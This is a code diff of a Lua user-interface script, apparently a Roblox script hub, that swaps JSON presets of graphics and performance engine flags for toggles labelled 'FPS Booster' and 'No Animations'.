-  "DebugForceFSMCPULightCulling": "True",
-  "MeshContentProviderForceCacheSize": "268435456",
-  "EnablePowerTraceModule": "True",
-  "GraphicsGLEnableHQShadersExclusion": "False",
-  "DoNotSkipMipsBasedOnSystemMemoryPS": "True",
-  "GraphicsGLEnableSuperHQShadersExclusion": "False",
-  "DebugPerfMode": "True",
-  "DebugPauseVoxelizer": "True",
-  "DebugEnableInterpolationVisualizer": "true",
-  "TerrainMaterialTable2022": "",
-  "RenderUseTextureManager224": "False",
-  "PerformanceControlTextureQualityBestUtility": "-1"
-}]]
-
-    local ANDROID_SAFE = [[{
-  "TextureQualityOverrideEnabled": "True",
-  "TextureQualityOverride": "0",
-  "DebugTextureManagerSkipMips": "3",
-  "DebugFRMQualityLevelOverride": "1",
-  "DebugForceMSAASamples": "0",
-  "FastGPULightCulling3": "True",
-  "IncludePowerSaverMode": "True"
-}]]
-
-    AddButton(cbCard, "Load Pro Preset into Editor", function()
-        if jsonInputObj and jsonInputObj.SetText then jsonInputObj.SetText(PRO_PRESET) end
-        customJsonInput = PRO_PRESET
-        Notify("Performance", "Pro preset loaded into editor. Click Apply FFlags.", 3)
+    AddToggle(potatoCard, "FFlags 1 (FPS Booster)", "120 FPS cap, smooth plastic textures, removes atmosphere fog, hides debris", false, function(state)
+        SetFFlags1(state)
     end)
 
-    AddButton(cbCard, "Load Android Preset into Editor", function()
-        if jsonInputObj and jsonInputObj.SetText then jsonInputObj.SetText(ANDROID_SAFE) end
-        customJsonInput = ANDROID_SAFE
-        Notify("Performance", "Android preset loaded into editor.", 3)
-    end)
-
-    AddButton(cbCard, "Apply Pro Preset", function()
-        applyFlagsFromJson(PRO_PRESET)
+    AddToggle(potatoCard, "No Animations", "Stops non-attack animations to fix sideways bug and character freezes", false, function(state)
+        SetNoAnimations(state)
     end)
 
     -- Card 4: Sky Changer (Darling Hub 13 Skies & Daylight Illumination)
